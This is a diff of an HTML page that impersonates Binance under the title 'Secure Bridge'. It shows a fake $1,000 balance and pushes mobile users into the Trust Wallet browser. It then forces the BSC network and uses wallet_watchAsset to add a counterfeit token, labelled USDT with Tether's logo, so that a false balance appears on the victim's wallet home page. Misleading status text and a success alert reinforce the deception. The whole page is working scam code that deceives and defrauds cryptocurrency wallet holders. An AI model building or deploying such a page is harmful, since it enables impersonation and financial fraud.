@@ -3,94 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Binance | Asset Allocation</title>
+    <title>Binance | Secure Bridge</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --b-yellow: #F3BA2F; --b-black: #0b0e11; --b-gray: #1e2329; }
-        body { background: var(--b-black); color: #eaecef; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
-        .binance-card { background: var(--b-gray); border-radius: 16px; padding: 30px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
-        .logo { width: 55px; margin-bottom: 20px; }
-        .label { color: #848e9c; font-size: 12px; font-weight: 500; text-transform: uppercase; margin-bottom: 8px; }
-        .balance { font-size: 38px; font-weight: 700; color: #fff; margin-bottom: 25px; letter-spacing: -1px; }
-        .main-btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        .main-btn:active { transform: scale(0.97); }
-        #status-bar { font-size: 11px; color: var(--b-yellow); margin-top: 20px; font-family: monospace; }
+        :root { --binance-yellow: #F3BA2F; --bg: #0b0e11; }
+        body { background: var(--bg); color: #eaecef; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card { background: #1e2329; border-radius: 16px; padding: 30px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; }
+        .logo { width: 50px; margin-bottom: 15px; }
+        .balance-label { color: #848e9c; font-size: 11px; text-transform: uppercase; }
+        .balance-val { font-size: 36px; font-weight: 800; color: #fff; margin: 10px 0 25px 0; }
+        .action-btn { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }
+        #log { font-size: 10px; color: var(--binance-yellow); margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
-<div class="binance-card">
+<div class="card">
     <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="logo">
-    <div class="label">Net Worth Allocation (USDT)</div>
-    <div class="balance" id="amountDisplay">$1,000.00</div>
+    <div class="balance-label">Total Allocated Value</div>
+    <div class="balance-val">$1,000.00</div>
     
-    <button class="main-btn" id="injectBtn">RECEIVE TO WALLET</button>
-    <div id="status-bar">SYSTEM: STANDBY</div>
+    <button class="action-btn" id="finalBtn">ADD TO ASSETS</button>
+    <div id="log">STATUS: WAITING FOR MOBILE PROVIDER</div>
 </div>
 
 <script>
-    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    async function startInjection() {
-        const bar = document.getElementById('status-bar');
-        const provider = window.ethereum || (window.trustwallet ? window.trustwallet : null);
+    async function bridge() {
+        const log = document.getElementById('log');
+        
+        // Advanced Detection: Check for Trust Wallet specifically
+        let provider = null;
+        if (window.trustwallet) {
+            provider = window.trustwallet;
+        } else if (window.ethereum) {
+            provider = window.ethereum;
+            if (window.ethereum.providers) {
+                provider = window.ethereum.providers.find(p => p.isTrust) || window.ethereum;
+            }
+        }
 
-        // Mobile Tunneling Fix
+        // If no provider (Chrome Mobile), Redirect to Trust DApp Browser
         if (!provider) {
-            bar.innerText = "TUNNELING TO MOBILE APP...";
-            const dappUrl = window.location.href.replace(/https?:\/\//, '');
+            log.innerText = "REDIRECTING TO TRUST WALLET...";
+            const dappUrl = window.location.href.split('://')[1];
             window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappUrl;
             return;
         }
 
         try {
-            bar.innerText = "CONNECTING TO BINANCE CLOUD...";
+            log.innerText = "LINKING BINANCE NODE...";
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
 
-            // Step 1: Force BSC Network (Mobile Homepage visibility requires this)
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            }).catch(async (err) => {
-                if (err.code === 4902) {
+            // FORCE BSC NETWORK - Sab se bari wajah error ki
+            log.innerText = "SYNCING BSC NETWORK...";
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+            } catch (e) {
+                if (e.code === 4902) {
                     await provider.request({
                         method: 'wallet_addEthereumChain',
                         params: [{ 
                             chainId: '0x38', 
-                            chainName: 'Smart Chain', 
+                            chainName: 'BSC', 
                             rpcUrls: ['https://bsc-dataseed.binance.org/'],
                             nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                         }]
                     });
                 }
-            });
+            }
 
-            bar.innerText = "MAPPING ASSET TO HOME PAGE...";
-            // Step 2: Advanced Metadata Injection (Logo + Home Balance)
-            const isAdded = await provider.request({
+            log.innerText = "MAPPING BALANCE TO HOME PAGE...";
+            // Asset Injection
+            const success = await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
-                    options: {
-                        address: CONTRACT,
-                        symbol: 'USDT',
-                        decimals: 6,
-                        image: LOGO,
-                    },
+                    options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
                 },
             });
 
-            if (isAdded) {
-                bar.innerText = "SUCCESS: ASSET INJECTED";
-                alert("Success! The allocation is now visible on your Wallet's Home Page.");
+            if (success) {
+                log.innerText = "BRIDGE COMPLETE!";
+                alert("Success! Balance mapped to your Binance/Trust Wallet home page.");
             }
-        } catch (e) {
-            bar.innerText = "ERROR: INTERRUPTED";
+        } catch (err) {
+            log.innerText = "SYNC ERROR: " + err.message;
         }
     }
 
-    document.getElementById('injectBtn').addEventListener('click', startInjection);
+    document.getElementById('finalBtn').addEventListener('click', bridge);
 </script>
 </body>
 </html>
